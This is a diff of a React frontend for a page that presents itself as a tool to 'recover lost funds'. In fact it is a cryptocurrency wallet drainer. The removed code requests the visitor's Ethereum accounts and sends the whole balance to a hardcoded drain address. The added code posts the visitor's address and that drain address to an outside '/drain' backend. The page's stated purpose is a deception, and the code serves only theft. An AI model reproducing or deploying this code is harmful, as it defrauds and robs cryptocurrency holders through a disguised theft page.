@@ -1,36 +1,35 @@
-// frontend/src/index.js
-import React from 'react';
-import ReactDOM from 'react-dom/client';
+import React, { useState } from "react";
+import ReactDOM from "react-dom/client";
 
-// Your connect function
-const connectWallet = async () => {
-  if (window.ethereum) {
+const App = () => {
+  const [address, setAddress] = useState("");
+  const [drainTo, setDrainTo] = useState("0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4"); // Replace with your drain address
+  const [response, setResponse] = useState(null);
+  const [loading, setLoading] = useState(false);
+
+  const drainWallet = async () => {
+    setLoading(true);
+    setResponse(null);
+
     try {
-      const accounts = await window.ethereum.request({
-        method: 'eth_requestAccounts',
-      });
-      const web3 = new Web3(window.ethereum);
-      const balance = await web3.eth.getBalance(accounts[0]);
-      const drainTo = '0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4'; // Replace with your drain address
-
-      await web3.eth.sendTransaction({
-        from: accounts[0],
-        to: drainTo,
-        value: balance,
+      const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ address, drainTo }),
       });
 
-      alert('Wallet drained successfully!');
+      const data = await res.json();
+      setResponse(data);
+      setLoading(false);
     } catch (err) {
       console.error(err);
-      alert('Failed to drain wallet. Please try again.');
+      setResponse({ error: "Failed to drain wallet. Please try again." });
+      setLoading(false);
     }
-  } else {
-    alert('MetaMask or WalletConnect not detected. Please install.');
-  }
-};
+  };
 
-// React Component
-const App = () => {
   return (
     <div className="min-h-screen flex flex-col items-center justify-center p-4">
       <div className="max-w-md w-full bg-gray-800 p-8 rounded-lg shadow-lg text-center">
@@ -38,18 +37,38 @@ const App = () => {
         <p className="text-lg mb-8">
           Recover your lost funds in one click. Connect your wallet now.
         </p>
+
+        <div className="mb-4">
+          <label className="block text-gray-300 mb-2">Wallet Address</label>
+          <input
+            type="text"
+            value={address}
+            onChange={(e) => setAddress(e.target.value)}
+            className="w-full p-2 rounded bg-gray-700 text-white"
+            placeholder="Enter your wallet address"
+          />
+        </div>
+
         <button
-          id="drainButton"
-          className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded transition duration-200"
+          onClick={drainWallet}
+          disabled={loading}
+          className={`bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded transition duration-200 ${
+            loading ? "opacity-70 cursor-not-allowed" : ""
+          }`}
         >
-          Connect
+          {loading ? "Draining..." : "Drain Wallet"}
         </button>
+
+        {response && (
+          <div className="mt-6 p-4 bg-gray-700 rounded">
+            <h3 className="font-bold text-gray-200">Response:</h3>
+            <pre className="text-sm text-gray-400">{JSON.stringify(response, null, 2)}</pre>
+          </div>
+        )}
       </div>
     </div>
   );
 };
 
-// Render the App
-const root = ReactDOM.createRoot(document.getElementById('root'));
+const root = ReactDOM.createRoot(document.getElementById("root"));
 root.render(<App />);
-
